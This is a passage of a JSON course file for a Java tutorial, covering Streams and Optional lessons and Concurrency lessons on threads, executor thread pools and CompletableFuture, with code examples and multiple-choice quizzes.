              "type": "MULTIPLE_CHOICE",
              "id": "streams-lesson-4-mc-1",
              "title": "flatMap Usage",
              "description": "Understanding when to use flatMap",
              "question": "You have a List<String> of sentences and want to get a stream of individual words. Which approach is correct?",
              "options": [
                "sentences.stream().map(s -> s.split(\" \"))",
                "sentences.stream().flatMap(s -> Arrays.stream(s.split(\" \")))",
                "sentences.stream().filter(s -> s.split(\" \"))",
                "sentences.stream().reduce(s -> s.split(\" \"))"
              ],
              "correctAnswer": 1,
              "explanation": "flatMap is used when you want to transform each element into multiple elements and flatten the result. map(s -> s.split(\" \")) would give you Stream<String[]>, but flatMap with Arrays.stream gives you Stream<String> - all words in a single flat stream.",
              "difficulty": "intermediate"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "streams-lesson-4-mc-2",
              "title": "groupingBy vs partitioningBy",
              "description": "Choosing the right grouping operation",
              "question": "What is the key difference between groupingBy and partitioningBy?",
              "options": [
                "partitioningBy is faster than groupingBy",
                "groupingBy can only group by String keys",
                "partitioningBy always returns exactly two groups (true/false), groupingBy can return any number of groups",
                "partitioningBy modifies the original collection"
              ],
              "correctAnswer": 2,
              "explanation": "partitioningBy uses a Predicate and always returns a Map with exactly two keys: true and false. groupingBy uses a classifier function and can return any number of groups based on the key values. Use partitioningBy for binary splits, groupingBy for multi-category grouping.",
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "streams-lesson-5",
          "title": "Lesson S.5: Optional & Null Safety",
          "moduleId": "module-streams",
          "order": 5,
          "estimatedMinutes": 35,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Null Problem",
              "content": "Null references are called 'the billion dollar mistake' by their inventor, Tony Hoare. They cause NullPointerExceptions - the most common Java bug.\n\nThe problem:\n  String name = findUserById(42);  // might return null!\n  int length = name.length();       // BOOM! NullPointerException\n\nTraditional defensive coding is ugly:\n  String name = findUserById(42);\n  if (name != null) {\n      int length = name.length();  // Safe, but verbose\n  }\n\nOptional<T> is Java's solution - a container that may or may not contain a value. It forces you to handle the 'no value' case explicitly.\n\nOptional<String> name = findUserById(42);\nname.ifPresent(n -> System.out.println(n.length()));\n\nOptional doesn't eliminate nulls, but it makes 'might be absent' explicit in the API."
            },
            {
              "type": "KEY_POINT",
              "title": "Creating Optionals",
              "content": "Create Optionals using factory methods, NEVER with the constructor:\n\nOptional.of(value): When value is definitely non-null\n  Optional<String> opt = Optional.of(\"hello\");\n  // Throws NullPointerException if value is null!\n\nOptional.ofNullable(value): When value might be null\n  Optional<String> opt = Optional.ofNullable(maybeNull);\n  // Safe: wraps null as empty Optional\n\nOptional.empty(): Explicit empty Optional\n  Optional<String> empty = Optional.empty();\n\nRULES:\n- NEVER pass null to Optional.of() - use ofNullable()\n- NEVER call get() without checking isPresent() first\n- NEVER use Optional for class fields - use it for return types\n- NEVER use Optional as method parameter - just use the value\n\nOptional is designed for return types to indicate 'might not have a result'."
            },
            {
              "type": "THEORY",
              "title": "Using Optionals Safely",
              "content": "Extracting values from Optional:\n\norElse(default): Return value or default if empty\n  String name = opt.orElse(\"Unknown\");\n\norElseGet(supplier): Return value or compute default lazily\n  String name = opt.orElseGet(() -> expensiveComputation());\n  // Supplier only called if Optional is empty\n\norElseThrow(): Return value or throw exception\n  String name = opt.orElseThrow();  // NoSuchElementException\n  String name = opt.orElseThrow(() -> new UserNotFoundException(id));\n\nConditional actions:\n\nifPresent(consumer): Execute if value present\n  opt.ifPresent(name -> System.out.println(name));\n\nifPresentOrElse(consumer, emptyAction): Java 9+\n  opt.ifPresentOrElse(\n      name -> System.out.println(\"Found: \" + name),\n      () -> System.out.println(\"Not found\")\n  );\n\nAVOID these anti-patterns:\n  if (opt.isPresent()) { opt.get(); }  // Just use orElse/ifPresent!\n  opt.get()  // NEVER without checking - defeats the purpose!"
            },
            {
              "type": "EXAMPLE",
              "title": "Optional in Practice",
              "content": "Using Optional effectively in real code:",
              "code": "import java.util.*;\n\nrecord User(int id, String name, String email) {}\n\nvoid main() {\n    Map<Integer, User> users = Map.of(\n        1, new User(1, \"Alice\", \"alice@example.com\"),\n        2, new User(2, \"Bob\", \"bob@example.com\")\n    );\n    \n    // Method returning Optional\n    Optional<User> findUser(int id) {\n        return Optional.ofNullable(users.get(id));\n    }\n    \n    // orElse: provide default\n    User user1 = findUser(1).orElse(new User(0, \"Guest\", \"guest@example.com\"));\n    System.out.println(user1.name());  // Alice\n    \n    User user99 = findUser(99).orElse(new User(0, \"Guest\", \"guest@example.com\"));\n    System.out.println(user99.name());  // Guest\n    \n    // orElseThrow: fail fast for required values\n    try {\n        User required = findUser(99).orElseThrow(\n            () -> new RuntimeException(\"User not found\")\n        );\n    } catch (RuntimeException e) {\n        System.out.println(\"Error: \" + e.getMessage());\n    }\n    \n    // map: transform if present\n    Optional<String> email = findUser(1).map(User::email);\n    email.ifPresent(e -> System.out.println(\"Email: \" + e));\n    \n    // filter: conditional extraction\n    Optional<User> alice = findUser(1)\n        .filter(u -> u.name().equals(\"Alice\"));\n    System.out.println(\"Is Alice? \" + alice.isPresent());  // true\n    \n    // flatMap: when the mapper returns Optional\n    Optional<String> getEmailDomain(int userId) {\n        return findUser(userId)\n            .map(User::email)\n            .flatMap(email -> {\n                int at = email.indexOf('@');\n                return at > 0 \n                    ? Optional.of(email.substring(at + 1)) \n                    : Optional.empty();\n            });\n    }\n    System.out.println(getEmailDomain(1).orElse(\"N/A\"));  // example.com\n}",
              "language": "java"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "streams-lesson-5-mc-1",
              "title": "Creating Optionals",
              "description": "Choosing the right Optional factory method",
              "question": "You're wrapping a value that might be null. Which method should you use?",
              "options": [
                "Optional.of(value)",
                "Optional.ofNullable(value)",
                "new Optional<>(value)",
                "Optional.empty()"
              ],
              "correctAnswer": 1,
              "explanation": "Optional.ofNullable() safely wraps a value that might be null - returning Optional.empty() if null. Optional.of() throws NullPointerException if the value is null. You cannot use 'new' with Optional. Optional.empty() always returns an empty Optional.",
              "difficulty": "intermediate"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "streams-lesson-5-mc-2",
              "title": "orElse vs orElseGet",
              "description": "Understanding lazy vs eager default evaluation",
              "question": "What is the advantage of orElseGet(supplier) over orElse(value)?",
              "options": [
                "orElseGet is faster because it uses parallel processing",
                "orElseGet only evaluates the default value when the Optional is empty (lazy evaluation)",
                "orElseGet can return different types than the Optional",
                "orElseGet throws an exception instead of returning null"
              ],
              "correctAnswer": 1,
              "explanation": "orElseGet uses lazy evaluation - the supplier is only called if the Optional is empty. With orElse(value), the default value is always computed even if not needed. This matters when the default involves expensive computation or side effects.",
              "difficulty": "intermediate"
            }
          ]
        }
      ],
      "order": 6
    },
    {
      "id": "module-concurrency",
      "title": "Concurrency & Virtual Threads",
      "description": "Master Java concurrency from threads and executors to CompletableFuture and Java 21's revolutionary virtual threads.",
      "difficulty": "advanced",
      "estimatedHours": 3.17,
      "lessons": [
        {
          "id": "concurrency-lesson-1",
          "title": "Lesson C.1: Why Concurrency?",
          "moduleId": "module-concurrency",
          "order": 1,
          "estimatedMinutes": 30,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: One Thing at a Time",
              "content": "Imagine a restaurant with ONE chef who must:\n1. Take orders at the counter\n2. Cook each dish\n3. Serve the food\n4. Clean tables\n\nWhile cooking, customers wait. While cleaning, food gets cold. The chef can only do ONE thing at a time.\n\nThis is how single-threaded programs work:\n\nvoid handleRequest() {\n    fetchDataFromDatabase();  // 200ms waiting\n    callExternalAPI();        // 500ms waiting\n    processResults();         // 10ms actual work\n}\n\nThe program WAITS 700ms but only WORKS for 10ms. That's 98.6% waiting!\n\nNow imagine 100 users making requests. With single-threaded processing, user #100 waits for 99 others to finish. Unacceptable."
            },
            {
              "type": "KEY_POINT",
              "title": "Concurrency vs Parallelism",
              "content": "These terms are often confused:\n\nCONCURRENCY:\n- Managing multiple tasks that COULD run at the same time\n- Like a chef juggling multiple dishes: start soup, while it simmers, chop vegetables\n- Tasks interleave, not necessarily simultaneous\n- About STRUCTURE\n\nPARALLELISM:\n- Actually running multiple tasks at the SAME time\n- Like having 4 chefs working simultaneously\n- Requires multiple CPU cores\n- About EXECUTION\n\nConcurrency enables parallelism, but they're different:\n- Concurrency: Write code that CAN run simultaneously\n- Parallelism: Actually RUN code simultaneously on multiple cores\n\nJava gives you both: write concurrent code, and the JVM + OS handle parallel execution on your multi-core CPU."
            },
            {
              "type": "THEORY",
              "title": "Why Concurrency Matters in 2025",
              "content": "Modern applications REQUIRE concurrency:\n\nWEB SERVERS:\n- Handle thousands of requests simultaneously\n- Each request waits for database, APIs, file I/O\n- Without concurrency: 1 slow request blocks everyone\n\nMICROSERVICES:\n- Service A calls Services B, C, D\n- Sequential: 100ms + 200ms + 150ms = 450ms\n- Concurrent: max(100, 200, 150) = 200ms (2.25x faster!)\n\nDATA PROCESSING:\n- Process millions of records\n- Split work across CPU cores\n- 8-core CPU = potentially 8x faster\n\nREAL-TIME APPLICATIONS:\n- Games: rendering while processing input\n- Chat apps: sending while receiving\n- Streaming: decoding while buffering\n\nModern CPUs have 8-16+ cores. Single-threaded code uses just ONE. Concurrency unlocks your hardware's full potential."
            },
            {
              "type": "KEY_POINT",
              "title": "The Mental Model: Threads as Workers",
              "content": "Think of threads as workers in a factory:\n\nSINGLE-THREADED (1 worker):\n[Worker 1]: Task A -> Task B -> Task C -> Task D\nTotal time: 4 hours\n\nMULTI-THREADED (4 workers):\n[Worker 1]: Task A\n[Worker 2]: Task B\n[Worker 3]: Task C\n[Worker 4]: Task D\nTotal time: 1 hour\n\nBUT there are complications:\n\nSHARED RESOURCES:\nWhat if Task A and Task B both need the printer?\n- They might corrupt each other's output\n- Need coordination (synchronization)\n\nDEPENDENCIES:\nWhat if Task C needs Task A's result?\n- Worker 3 must WAIT for Worker 1\n- Not fully parallelizable\n\nCOMMUNICATION OVERHEAD:\nWorkers need to coordinate:\n- 'I'm using the printer now'\n- 'Here's my result for you'\n- Coordination takes time too\n\nThis course teaches you to manage all these challenges."
            },
            {
              "type": "THEORY",
              "title": "Java's Concurrency Evolution",
              "content": "Java's concurrency has evolved dramatically:\n\nJAVA 1.0 (1996): Basic Threads\n- Thread class, synchronized keyword\n- Low-level, error-prone\n\nJAVA 5 (2004): java.util.concurrent\n- ExecutorService, thread pools\n- Concurrent collections\n- Locks, semaphores, barriers\n\nJAVA 8 (2014): CompletableFuture\n- Async programming with callbacks\n- Composable futures\n- Parallel streams\n\nJAVA 21 (2023): Virtual Threads\n- Lightweight threads (millions possible!)\n- Simple blocking code, high scalability\n- Game changer for I/O-bound applications\n\nThis module covers it all, culminating in virtual threads - the biggest concurrency innovation since Java 5."
            },
            {
              "type": "WARNING",
              "title": "Concurrency is Hard (But Learnable)",
              "content": "Concurrency bugs are notoriously difficult:\n\nRACE CONDITIONS:\nThread 1: read balance (100)\nThread 2: read balance (100)\nThread 1: write balance (100 + 50 = 150)\nThread 2: write balance (100 - 30 = 70)  // WRONG! Should be 120\n\nDEADLOCKS:\nThread 1: holds Lock A, waiting for Lock B\nThread 2: holds Lock B, waiting for Lock A\nBoth wait forever!\n\nMEMORY VISIBILITY:\nThread 1: sets flag = true\nThread 2: reads flag... still sees false (cached!)\n\nThese bugs are:\n- Intermittent (work 99% of the time, fail in production)\n- Hard to reproduce (timing-dependent)\n- Hard to debug (stepping through changes timing)\n\nBUT: Java provides tools to prevent them. This course teaches you the safe patterns."
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "concurrency-lesson-1-mc-1",
              "title": "Concurrency vs Parallelism",
              "description": "Understanding the difference between concurrency and parallelism",
              "question": "A single-core CPU running a web server that handles multiple requests by switching between them is an example of:",
              "options": [
                "Parallelism only",
                "Concurrency only",
                "Both concurrency and parallelism",
                "Neither concurrency nor parallelism"
              ],
              "correctAnswer": 1,
              "explanation": "This is concurrency without parallelism. The CPU switches between tasks (concurrency), but only one task runs at any instant (no parallelism). Parallelism requires multiple cores executing simultaneously. Concurrency is about structure (handling multiple tasks); parallelism is about execution (running simultaneously).",
              "difficulty": "intermediate"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "concurrency-lesson-1-mc-2",
              "title": "Why Concurrency?",
              "description": "Understanding the benefits of concurrent programming",
              "question": "A microservice needs to call three external APIs (taking 100ms, 200ms, and 150ms respectively). What's the minimum total time if calls are made concurrently?",
              "options": [
                "450ms (sum of all calls)",
                "200ms (the longest call)",
                "150ms (average of calls)",
                "100ms (the shortest call)"
              ],
              "correctAnswer": 1,
              "explanation": "With concurrent execution, all three API calls start at the same time. The total time is determined by the slowest call (200ms), since all three run in parallel. Sequential execution would take 450ms (100+200+150). This 2.25x speedup is why concurrency matters for I/O-bound operations.",
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "concurrency-lesson-2",
          "title": "Lesson C.2: Threads & Runnables",
          "moduleId": "module-concurrency",
          "order": 2,
          "estimatedMinutes": 40,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "What is a Thread?",
              "content": "A thread is an independent path of execution within a program.\n\nEvery Java program starts with ONE thread: the main thread.\n\nvoid main() {\n    System.out.println(\"Hello\");  // Runs on main thread\n    doSomething();                 // Still main thread\n}\n\nBut you can create ADDITIONAL threads:\n\n// Main thread creates a new thread\nThread worker = new Thread(() -> {\n    System.out.println(\"I'm on a different thread!\");\n});\nworker.start();  // Now TWO threads running!\n\nEach thread has its own:\n- Call stack (method calls, local variables)\n- Program counter (current instruction)\n\nThreads SHARE:\n- Heap memory (objects, arrays)\n- Static variables\n- File handles, network connections\n\nThis sharing is powerful but dangerous - it's where bugs come from."
            },
            {
              "type": "KEY_POINT",
              "title": "Creating Threads: Two Approaches",
              "content": "APPROACH 1: Implement Runnable (PREFERRED)\n\nRunnable task = () -> {\n    System.out.println(\"Running in: \" + Thread.currentThread().getName());\n};\n\nThread thread = new Thread(task);\nthread.start();\n\nWhy preferred:\n- Separates WHAT to do (Runnable) from HOW to run it (Thread)\n- Can reuse same Runnable with different executors\n- Java is single-inheritance; Runnable doesn't use up your one extends\n\nAPPROACH 2: Extend Thread (RARE)\n\nclass MyThread extends Thread {\n    @Override\n    public void run() {\n        System.out.println(\"Running!\");\n    }\n}\n\nnew MyThread().start();\n\nRarely used because:\n- Uses up your single inheritance\n- Couples task logic to Thread class\n\n2025 REALITY: You rarely create Thread objects directly. Use ExecutorService or Virtual Threads instead. But understanding Thread is foundational."
            },
            {
              "type": "THEORY",
              "title": "Thread Lifecycle",
              "content": "Threads go through several states:\n\nNEW:\n- Thread created but not started\n- Thread t = new Thread(task);  // NEW state\n\nRUNNABLE:\n- t.start() called, ready to run\n- May be running or waiting for CPU\n\nBLOCKED:\n- Waiting to acquire a lock\n- synchronized block occupied by another thread\n\nWAITING:\n- Waiting indefinitely for another thread\n- t.join(), Object.wait() without timeout\n\nTIMED_WAITING:\n- Waiting with timeout\n- Thread.sleep(1000), t.join(1000)\n\nTERMINATED:\n- run() method completed (normally or with exception)\n- Thread cannot be restarted!\n\nVisualize:\nNEW --> RUNNABLE <--> BLOCKED/WAITING --> TERMINATED\n           ^                 |\n           |_________________|\n                (resumed)"
            },
            {
              "type": "EXAMPLE",
              "title": "Basic Thread Operations",
              "content": "Essential thread operations you need to know:",
              "code": "void main() throws InterruptedException {\n    // Create a thread with a task\n    Thread worker = new Thread(() -> {\n        String name = Thread.currentThread().getName();\n        System.out.println(name + \" started\");\n        \n        try {\n            // Simulate work\n            Thread.sleep(1000);  // Pause for 1 second\n        } catch (InterruptedException e) {\n            System.out.println(name + \" was interrupted\");\n            return;\n        }\n        \n        System.out.println(name + \" finished\");\n    });\n    \n    // Give it a meaningful name (helps debugging)\n    worker.setName(\"DataProcessor\");\n    \n    // Check state before starting\n    System.out.println(\"State: \" + worker.getState());  // NEW\n    \n    // Start the thread (don't call run() directly!)\n    worker.start();\n    System.out.println(\"State: \" + worker.getState());  // RUNNABLE\n    \n    // Main thread continues immediately!\n    System.out.println(\"Main thread continues...\");\n    \n    // Wait for worker to complete\n    worker.join();  // Blocks until worker finishes\n    System.out.println(\"State: \" + worker.getState());  // TERMINATED\n    \n    System.out.println(\"Worker completed, main resumes\");\n}",
              "language": "java"
            },
            {
              "type": "WARNING",
              "title": "Critical Thread Pitfalls",
              "content": "MISTAKE 1: Calling run() instead of start()\n\nthread.run();   // WRONG! Runs on CURRENT thread\nthread.start(); // CORRECT! Runs on NEW thread\n\nrun() just calls the method normally. start() creates a new thread.\n\nMISTAKE 2: Starting a thread twice\n\nthread.start();\nthread.start();  // IllegalThreadStateException!\n\nOnce terminated, a thread cannot restart. Create a new Thread.\n\nMISTAKE 3: Ignoring InterruptedException\n\ntry {\n    Thread.sleep(1000);\n} catch (InterruptedException e) {\n    // DON'T just ignore it!\n    Thread.currentThread().interrupt();  // Restore flag\n    return;  // Or handle appropriately\n}\n\nInterruption is a cooperative cancellation mechanism. Don't swallow it.\n\nMISTAKE 4: Not joining threads\n\nIf main() ends before worker threads, the JVM might exit. Use join() to wait, or use ExecutorService with proper shutdown."
            },
            {
              "type": "THEORY",
              "title": "Thread Communication: join() and interrupt()",
              "content": "JOINING THREADS:\nWait for another thread to complete.\n\nThread worker = new Thread(task);\nworker.start();\n\n// Wait at most 5 seconds\nworker.join(5000);  // Returns after 5s OR when worker finishes\n\nif (worker.isAlive()) {\n    System.out.println(\"Worker still running after 5s\");\n}\n\nINTERRUPTING THREADS:\nRequest a thread to stop (cooperative, not forced).\n\nThread worker = new Thread(() -> {\n    while (!Thread.currentThread().isInterrupted()) {\n        // Do work\n    }\n    System.out.println(\"Received interrupt, stopping\");\n});\n\nworker.start();\nThread.sleep(1000);\nworker.interrupt();  // Set interrupt flag\n\nIMPORTANT: interrupt() doesn't STOP the thread. It:\n1. Sets a flag (isInterrupted())\n2. Throws InterruptedException if sleeping/waiting\n\nThe thread must CHECK the flag and stop voluntarily."
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "concurrency-lesson-2-mc-1",
              "title": "start() vs run()",
              "description": "Understanding the difference between start() and run()",
              "question": "What happens when you call thread.run() instead of thread.start()?",
              "options": [
                "The thread runs faster because there's no setup overhead",
                "The run() method executes on the CURRENT thread, not a new thread",
                "An IllegalThreadStateException is thrown",
                "The thread runs in the background"
              ],
              "correctAnswer": 1,
              "explanation": "Calling run() directly just invokes the method on the current thread like any normal method call. No new thread is created. You must call start() to create a new thread that then invokes run(). This is a common beginner mistake.",
              "difficulty": "intermediate"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "concurrency-lesson-2-mc-2",
              "title": "Thread States",
              "description": "Understanding thread lifecycle states",
              "question": "A thread calls Thread.sleep(5000). What state is it in during those 5 seconds?",
              "options": [
                "RUNNABLE",
                "BLOCKED",
                "WAITING",
                "TIMED_WAITING"
              ],
              "correctAnswer": 3,
              "explanation": "Thread.sleep() with a timeout puts the thread in TIMED_WAITING state. WAITING is for indefinite waits (like join() without timeout). BLOCKED is for waiting to acquire a lock. RUNNABLE means the thread is ready to execute (or executing).",
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "concurrency-lesson-3",
          "title": "Lesson C.3: Executors & Thread Pools",
          "moduleId": "module-concurrency",
          "order": 3,
          "estimatedMinutes": 40,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem with Raw Threads",
              "content": "Creating threads directly has problems:\n\n// Bad: Create new thread for every task\nfor (int i = 0; i < 10000; i++) {\n    new Thread(() -> handleRequest()).start();\n}\n\nPROBLEMS:\n\n1. EXPENSIVE CREATION:\n   - Each Thread = ~1MB stack memory\n   - OS resources allocated\n   - 10,000 threads = 10GB memory!\n\n2. UNCONTROLLED GROWTH:\n   - No limit on concurrent threads\n   - Server overload under high load\n   - Out of memory crashes\n\n3. NO REUSE:\n   - Thread dies after task completes\n   - Create new one for next task\n   - Wasted setup/teardown\n\n4. POOR ERROR HANDLING:\n   - Exceptions in threads are silent\n   - No way to get results\n   - Hard to monitor\n\nSOLUTION: Thread Pools via ExecutorService"
            },
            {
              "type": "KEY_POINT",
              "title": "ExecutorService: Thread Pool Management",
              "content": "ExecutorService manages a pool of reusable threads:\n\n// Create a pool of 10 threads\nExecutorService executor = Executors.newFixedThreadPool(10);\n\n// Submit 1000 tasks - only 10 run at once\nfor (int i = 0; i < 1000; i++) {\n    executor.submit(() -> handleRequest());\n}\n\n// When done, shutdown gracefully\nexecutor.shutdown();\n\nBENEFITS:\n\n1. REUSE: 10 threads handle 1000 tasks\n   - Each thread is reused ~100 times\n   - Minimal memory overhead\n\n2. BOUNDED: Max 10 concurrent tasks\n   - Prevents resource exhaustion\n   - Predictable resource usage\n\n3. QUEUING: Excess tasks wait in queue\n   - Smooth handling of load spikes\n   - No rejected requests\n\n4. MANAGED LIFECYCLE:\n   - Clean shutdown\n   - Proper exception handling"
            },
            {
              "type": "THEORY",
              "title": "Types of Thread Pools",
              "content": "Executors factory provides several pool types:\n\nFIXED THREAD POOL:\nExecutors.newFixedThreadPool(int n)\n- Exactly n threads, no more, no less\n- Tasks queue when all threads busy\n- Best for: known workload, predictable resources\n\nCACHED THREAD POOL:\nExecutors.newCachedThreadPool()\n- Creates threads as needed\n- Reuses idle threads\n- Removes threads idle > 60 seconds\n- Best for: many short-lived tasks\n- WARNING: Can create unbounded threads under load!\n\nSINGLE THREAD EXECUTOR:\nExecutors.newSingleThreadExecutor()\n- Exactly 1 thread\n- Tasks execute sequentially\n- Best for: ordered task execution, avoiding concurrency\n\nSCHEDULED THREAD POOL:\nExecutors.newScheduledThreadPool(int n)\n- Run tasks after delay or periodically\n- Best for: timers, periodic jobs\n\n2025 BEST PRACTICE:\nFor most web apps, use fixed pool sized to available cores:\nExecutors.newFixedThreadPool(Runtime.getRuntime().availableProcessors())"
            },
            {
              "type": "EXAMPLE",
              "title": "Using ExecutorService",
              "content": "Complete example with proper shutdown and result handling:",
              "code": "import java.util.concurrent.*;\nimport java.util.*;\n\nvoid main() throws Exception {\n    // Create a thread pool with 4 workers\n    ExecutorService executor = Executors.newFixedThreadPool(4);\n    \n    try {\n        // Submit Runnable (no return value)\n        executor.submit(() -> {\n            System.out.println(\"Task 1 on \" + Thread.currentThread().getName());\n        });\n        \n        // Submit Callable (returns a value)\n        Future<Integer> future = executor.submit(() -> {\n            Thread.sleep(500);\n            return 42;\n        });\n        \n        // Do other work while task runs...\n        System.out.println(\"Doing other work...\");\n        \n        // Get result (blocks until complete)\n        Integer result = future.get();  // Waits up to forever\n        System.out.println(\"Result: \" + result);\n        \n        // Get with timeout\n        Future<String> future2 = executor.submit(() -> {\n            Thread.sleep(2000);\n            return \"Done!\";\n        });\n        \n        try {\n            String result2 = future2.get(1, TimeUnit.SECONDS);  // Only wait 1s\n        } catch (TimeoutException e) {\n            System.out.println(\"Task took too long!\");\n            future2.cancel(true);  // Cancel the task\n        }\n        \n        // Submit multiple tasks\n        List<Callable<Integer>> tasks = List.of(\n            () -> { Thread.sleep(100); return 1; },\n            () -> { Thread.sleep(200); return 2; },\n            () -> { Thread.sleep(150); return 3; }\n        );\n        \n        // invokeAll waits for ALL to complete\n        List<Future<Integer>> futures = executor.invokeAll(tasks);\n        for (Future<Integer> f : futures) {\n            System.out.println(\"Got: \" + f.get());\n        }\n        \n    } finally {\n        // CRITICAL: Always shutdown!\n        executor.shutdown();\n        \n        // Wait for tasks to finish (with timeout)\n        if (!executor.awaitTermination(5, TimeUnit.SECONDS)) {\n            System.out.println(\"Forcing shutdown...\");\n            executor.shutdownNow();  // Force stop\n        }\n    }\n}",
              "language": "java"
            },
            {
              "type": "WARNING",
              "title": "ExecutorService Pitfalls",
              "content": "MISTAKE 1: Forgetting to shutdown\n\nExecutorService executor = Executors.newFixedThreadPool(4);\nexecutor.submit(task);\n// Program never exits! Non-daemon threads keep JVM alive\n\nALWAYS call shutdown() in a finally block or use try-with-resources (Java 19+).\n\nMISTAKE 2: Using newCachedThreadPool for I/O tasks\n\n// Under load, can create thousands of threads!\nExecutorService bad = Executors.newCachedThreadPool();\nfor (int i = 0; i < 100000; i++) {\n    bad.submit(() -> httpClient.get(url));  // Each waits on I/O\n}\n// OutOfMemoryError: unable to create new native thread\n\nUse fixed pool or virtual threads for I/O-bound work.\n\nMISTAKE 3: Ignoring Future exceptions\n\nFuture<?> f = executor.submit(() -> {\n    throw new RuntimeException(\"Oops!\");\n});\n// Exception is SILENT until you call get()\nf.get();  // Now ExecutionException is thrown\n\nAlways call get() or handle exceptions in the task itself."
            },
            {
              "type": "KEY_POINT",
              "title": "Proper Shutdown Pattern",
              "content": "The standard shutdown pattern ensures clean termination:\n\nvoid shutdownGracefully(ExecutorService executor) {\n    executor.shutdown();  // Stop accepting new tasks\n    \n    try {\n        // Wait for existing tasks to finish\n        if (!executor.awaitTermination(60, TimeUnit.SECONDS)) {\n            // Tasks didn't finish in time\n            executor.shutdownNow();  // Cancel running tasks\n            \n            // Wait a bit more\n            if (!executor.awaitTermination(60, TimeUnit.SECONDS)) {\n                System.err.println(\"Executor did not terminate\");\n            }\n        }\n    } catch (InterruptedException e) {\n        // Current thread was interrupted\n        executor.shutdownNow();\n        Thread.currentThread().interrupt();\n    }\n}\n\nJAVA 19+ ALTERNATIVE:\nExecutorService implements AutoCloseable:\n\ntry (var executor = Executors.newFixedThreadPool(4)) {\n    executor.submit(task);\n}  // Automatically calls shutdown() and awaits termination"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "concurrency-lesson-3-mc-1",
              "title": "Choosing Thread Pools",
              "description": "Understanding which thread pool to use",
              "question": "You're building a web server that needs to handle HTTP requests. Each request involves I/O (database, external APIs) and you expect up to 1000 concurrent requests. Which pool type is MOST appropriate?",
              "options": [
                "Executors.newCachedThreadPool() - creates threads as needed",
                "Executors.newSingleThreadExecutor() - sequential processing",
                "Executors.newFixedThreadPool(n) - bounded pool",
                "No pool needed - create new Thread for each request"
              ],
              "correctAnswer": 2,
              "explanation": "For I/O-bound workloads with high concurrency, use a fixed thread pool. CachedThreadPool could create 1000+ threads, exhausting memory. SingleThread would be too slow. Raw threads have no reuse. A fixed pool with appropriately sized thread count (or virtual threads in Java 21+) is ideal.",
              "difficulty": "intermediate"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "concurrency-lesson-3-mc-2",
              "title": "ExecutorService Shutdown",
              "description": "Understanding proper executor lifecycle",
              "question": "What happens if you never call shutdown() on an ExecutorService?",
              "options": [
                "The executor automatically shuts down when all tasks complete",
                "The JVM never exits because executor threads are still alive",
                "A memory leak occurs but the program can still exit",
                "An exception is thrown after 60 seconds"
              ],
              "correctAnswer": 1,
              "explanation": "ExecutorService threads are non-daemon by default. The JVM won't exit while non-daemon threads are alive. Your program will hang indefinitely until you call shutdown(). Always shutdown executors in a finally block or use try-with-resources (Java 19+).",
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "concurrency-lesson-4",
          "title": "Lesson C.4: CompletableFuture",
          "moduleId": "module-concurrency",
          "order": 4,
          "estimatedMinutes": 45,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem with Future",
              "content": "Basic Future has limitations:\n\nFuture<String> future = executor.submit(() -> fetchData());\n\n// Problem 1: Blocking get()\nString result = future.get();  // BLOCKS the thread!\n\n// Problem 2: No callbacks\n// Can't say: 'when done, do this'\n// Must poll: while (!future.isDone()) { }\n\n// Problem 3: Can't chain operations\n// Want: fetch data -> parse -> transform -> save\n// Future gives no way to compose these\n\n// Problem 4: No exception handling in chain\n// Must try/catch around every get()\n\nCompletableFuture solves all of these:\n- Non-blocking composition\n- Callbacks on completion\n- Exception handling in the chain\n- Combine multiple futures"
            },
            {
              "type": "KEY_POINT",
              "title": "CompletableFuture Basics",
              "content": "CompletableFuture represents a future result that can be completed:\n\n// Run async task (uses ForkJoinPool by default)\nCompletableFuture<String> cf = CompletableFuture.supplyAsync(() -> {\n    return fetchData();  // Runs in background\n});\n\n// Non-blocking: attach callback\ncf.thenAccept(result -> System.out.println(\"Got: \" + result));\n\n// Main thread continues immediately!\nSystem.out.println(\"Not blocked!\");\n\nKEY METHODS:\n\nsupplyAsync(Supplier<T>): Run async, return result\nrunAsync(Runnable): Run async, no result\n\nthenApply(Function): Transform result\nthenAccept(Consumer): Consume result\nthenRun(Runnable): Run action when complete\n\njoin(): Get result (like get() but unchecked exception)\nget(): Get result (checked exception)\n\nThe 'Async' suffix methods run callbacks on thread pool instead of completing thread."
            },
            {
              "type": "THEORY",
              "title": "Chaining Operations",
              "content": "CompletableFuture enables fluent async pipelines:\n\nCompletableFuture.supplyAsync(() -> fetchUserId())\n    .thenApply(id -> fetchUserDetails(id))     // Transform\n    .thenApply(user -> user.getEmail())        // Transform again\n    .thenAccept(email -> sendEmail(email))     // Consume\n    .exceptionally(ex -> {                     // Handle errors\n        log.error(\"Failed\", ex);\n        return null;\n    });\n\nDIFFERENCE: thenApply vs thenCompose\n\nthenApply: When transformation returns a VALUE\n  .thenApply(id -> \"User: \" + id)  // String -> String\n\nthenCompose: When transformation returns a FUTURE (flatMap)\n  .thenCompose(id -> fetchUserAsync(id))  // String -> CF<User>\n\nUsing thenApply with a method returning CompletableFuture gives you CompletableFuture<CompletableFuture<T>> - probably not what you want!"
            },
            {
              "type": "EXAMPLE",
              "title": "CompletableFuture in Practice",
              "content": "Real-world async operations with proper error handling:",
